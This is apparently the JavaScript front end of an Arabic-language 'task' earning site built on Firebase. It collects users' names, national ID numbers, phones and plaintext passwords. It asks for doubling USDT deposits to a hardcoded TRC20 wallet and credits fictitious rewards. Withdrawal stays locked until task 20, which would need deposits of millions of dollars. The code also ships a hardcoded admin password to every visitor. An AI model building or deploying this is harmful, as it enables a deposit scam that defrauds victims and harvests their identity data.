// ==== Firebase & DB ====
const db = firebase.firestore();
let currentUser = null;
const adminPassword = "aalmwt10";

// ==== Header ====
function showHeader(show){document.getElementById("header").style.display = show ? "flex" : "none";}

// ==== تسجيل الدخول / إنشاء حساب ====
function loginPage(){
  showHeader(false);
  document.getElementById("app").innerHTML=`
<div class="container"><div class="box">
<h2 style="text-align:center;">تسجيل الدخول</h2>
<input id="loginEmail" type="email" placeholder="البريد الإلكتروني">
<input id="loginPass" type="password" placeholder="كلمة المرور">
<button onclick="login()">تسجيل الدخول</button>
<button onclick="registerPage()" style="background:#444;color:white;">إنشاء حساب</button>
</div></div>`;
}

function registerPage(){
  showHeader(false);
  document.getElementById("app").innerHTML=`
<div class="container"><div class="box">
<h2 style="text-align:center;">إنشاء حساب جديد</h2>
<input id="regName" placeholder="الاسم الكامل">
<input id="regEmail" type="email" placeholder="البريد الإلكتروني">
<input id="regNID" placeholder="الرقم الوطني">
<input id="regPhone" placeholder="رقم الهاتف">
<select id="regCountry">
<option value="+963">🇸🇾 سوريا +963</option>
<option value="+20">🇪🇬 مصر +20</option>
<option value="+971">🇦🇪 الإمارات +971</option>
<option value="+90">🇹🇷 تركيا +90</option>
</select>
<input id="regPass" type="password" placeholder="كلمة المرور">
<button onclick="register()">تسجيل</button>
<button onclick="loginPage()" style="background:#444;color:white;">رجوع</button>
</div></div>`;
}

async function register(){
  let name=document.getElementById("regName").value;
  let email=document.getElementById("regEmail").value;
  let nid=document.getElementById("regNID").value;
  let phone=document.getElementById("regPhone").value;
  let country=document.getElementById("regCountry").value;
  let pass=document.getElementById("regPass").value;

  if(!name||!email||!nid||!phone||!pass){ alert("يرجى ملء جميع الحقول"); return;}

  await db.collection("users").doc(email).set({
    name,email,nid,phone,country,pass,
    balance:0,
    tasksCompleted:0,
    depositRequests:[],
    withdrawRequests:[]
  });

  loginUser(email, pass);
}

async function login(){
  let email=document.getElementById("loginEmail").value;
  let pass=document.getElementById("loginPass").value;
  loginUser(email, pass);
}

async function loginUser(email, pass){
  let doc = await db.collection("users").doc(email).get();
  if(!doc.exists || doc.data().pass !== pass){ alert("بيانات غير صحيحة"); return; }
  currentUser = doc.data();
  localStorage.setItem("currentUserEmail", email);
  homePage();
}

// ==== تحديث المستخدم ====
async function updateUser(){
  if(!currentUser) return;
  await db.collection("users").doc(currentUser.email).set(currentUser);
}

// ==== عرض الحساب ====
function accountPage(){
  showHeader(true);
  document.getElementById("app").innerHTML=`
  <div class="container">
    <h2 class="account-title">📄 بيانات الحساب</h2>
    <div class="account-box">
      <p><span class="label">الاسم:</span>${currentUser.name}</p>
      <p><span class="label">البريد الإلكتروني:</span>${currentUser.email}</p>
      <p><span class="label">رقم الهاتف:</span>${currentUser.phone}</p>
      <p><span class="label">الدولة:</span>${currentUser.country}</p>
      <p><span class="label">الرصيد الحالي:</span>${currentUser.balance}$</p>
      <p><span class="label">المهام المكتملة:</span>${currentUser.tasksCompleted}</p>
      <button class="back-btn" onclick="homePage()">رجوع</button>
    </div>
  </div>`;
}

// ==== الصفحة الرئيسية + المهام ====
function homePage(){
  showHeader(true);
  let tasksHtml="";
  let depositAmount=10;
  let reward=20;

  for(let i=1;i<=25;i++){
    let locked = currentUser.balance < depositAmount || currentUser.tasksCompleted >= i;
    tasksHtml+=`
    <div class="task ${locked?'locked':''}">
      <i class="fa-solid fa-rocket"></i>
      <div class="task-content">
        <h3>المهمة رقم ${i}</h3>
        <p>الإيداع المطلوب: <b>${depositAmount}$</b></p>
        <p>الربح عند الإنجاز: <b>${reward}$</b></p>
        <button onclick="openTask(${i},${depositAmount},${reward})" ${locked?'disabled':''}>تنفيذ المهمة</button>
      </div>
    </div>`;
    depositAmount*=2; reward*=2;
  }

  document.getElementById("app").innerHTML=`<div class="container">${tasksHtml}</div>`;
}

// ==== فتح المهمة ====
function openTask(num,dep,rew){
  document.getElementById("app").innerHTML=`
  <div class="container">
    <div class="box">
      <h2>المهمة رقم ${num}</h2>
      <p>المطلوب قبل التنفيذ: إيداع ${dep}$</p>
      <p>ربحك بعد الإنجاز: ${rew}$</p>
      <button onclick="checkDeposit(${num},${dep},${rew})">تنفيذ المهمة</button>
      <button class="back-btn" onclick="homePage()">رجوع</button>
    </div>
  </div>`;
}

async function checkDeposit(num,dep,rew){
  if(currentUser.tasksCompleted >= num){ alert("✅ لقد أنجزت هذه المهمة سابقاً"); return;}
  if(currentUser.balance < dep){ alert(`❌ يجب إيداع ${dep}$ لفتح المهمة`); return;}
  currentUser.balance += rew;
  currentUser.tasksCompleted++;
  await updateUser();
  alert("✅ تم تنفيذ المهمة وتم إضافة الأرباح!");
  homePage();
}

// ==== الإيداع ====
function depositPage(){
  document.getElementById("app").innerHTML=`
  <div class="container">
    <div class="box">
      <h2>إيداع الأموال</h2>
      <p>لإضافة رصيد، يرجى تحويل المبلغ إلى المحفظة التالية:</p>
      <p style="font-weight:bold;">USDT TRC20: <span style="color:#ff416c;">TQi3mspeUBS1Y4NknPu4zZVFiFG2JU5MkX</span></p>
      <input id="depositAmount" type="number" placeholder="المبلغ الذي حولته">
      <input id="depositImage" type="file" accept="image/*">
      <button onclick="submitDeposit()">تقديم طلب الإيداع</button>
      <button class="back-btn" onclick="homePage()">رجوع</button>
    </div>
  </div>`;
}

function submitDeposit(){
  let amount=parseFloat(document.getElementById("depositAmount").value);
  let image=document.getElementById("depositImage").files[0];
  if(!amount||!image){ alert("يرجى إدخال المبلغ ورفع الصورة"); return;}
  let reader=new FileReader();
  reader.onload=function(){
    currentUser.depositRequests.push({amount,image:reader.result,date:new Date().toLocaleString()});
    updateUser();
    alert("✅ تم إرسال طلب الإيداع");
    homePage();
  }
  reader.readAsDataURL(image);
}

// ==== السحب ====
function withdrawPage(){
  if(currentUser.tasksCompleted < 20){ alert("❌ لا يمكن السحب قبل المهمة 20"); return;}
  document.getElementById("app").innerHTML=`
  <div class="container">
    <div class="box">
      <h2>سحب الأموال</h2>
      <p>رصيدك: ${currentUser.balance}$</p>
      <input id="withdrawWallet" placeholder="أدخل محفظتك">
      <button onclick="submitWithdraw()">طلب سحب</button>
      <button class="back-btn" onclick="homePage()">رجوع</button>
    </div>
  </div>`;
}

function submitWithdraw(){
  let w=document.getElementById("withdrawWallet").value;
  if(!w){ alert("يرجى إدخال المحفظة"); return;}
  currentUser.withdrawRequests.push({wallet:w,amount:currentUser.balance,date:new Date().toLocaleString()});
  currentUser.balance=0;
  updateUser();
  alert("✅ تم إرسال طلب السحب");
  homePage();
}

// ==== تسجيل الخروج ====
function logout(){currentUser=null;localStorage.removeItem("currentUserEmail");showHeader(false);loginPage();}

// ==== لوحة الإدارة ====
async function adminLogin(){
  let pwd=prompt("ادخل كلمة مرور الادمن:");
  if(pwd!==adminPassword){ alert("كلمة مرور خاطئة"); return;}
  showHeader(false);

  let usersSnapshot = await db.collection("users").get();
  let requestsHtml="";
  usersSnapshot.forEach(doc=>{
    let u = doc.data();
    u.depositRequests.forEach((r,i)=>{
      requestsHtml+=`
      <div class="admin-request">
        <p><b>المستخدم:</b> ${u.name} | ${u.email} | ${u.phone}</p>
        <p><b>المبلغ:</b> ${r.amount}$ | التاريخ: ${r.date}</p>
        <img src="${r.image}" alt="صورة الإيداع">
        <div style="display:flex;gap:10px;">
          <button onclick="approveDeposit('${u.email}',${i})">✅ قبول</button>
          <button class="reject" onclick="rejectDeposit('${u.email}',${i})">❌ رفض</button>
        </div>
      </div>`;
    });
  });
  document.getElementById("app").innerHTML=`<div class="container"><div class="admin-box"><h2>طلبات الإيداع</h2>${requestsHtml}<button class="back-btn" onclick="homePage()">رجوع</button></div></div>`;
}

async function approveDeposit(email,index){
  let docRef = db.collection("users").doc(email);
  let doc = await docRef.get();
  if(!doc.exists) return;
  let user = doc.data();
  let req = user.depositRequests[index];
  user.balance += req.amount;
  user.depositRequests.splice(index,1);
  await docRef.set(user);
  if(currentUser.email===email) currentUser=user;
  adminLogin();
}

async function rejectDeposit(email,index){
  let docRef = db.collection("users").doc(email);
  let doc = await docRef.get();
  if(!doc.exists) return;
  let user = doc.data();
  user.depositRequests.splice(index,1);
  await docRef.set(user);
  adminLogin();
}

// ==== بدء التطبيق ====
window.onload = async ()=>{
  let email = localStorage.getItem("currentUserEmail");
  if(email){
    let doc = await db.collection("users").doc(email).get();
    if(doc.exists) currentUser = doc.data();
  }
  currentUser ? showHeader(true) : showHeader(false);
  currentUser ? homePage() : loginPage();
};
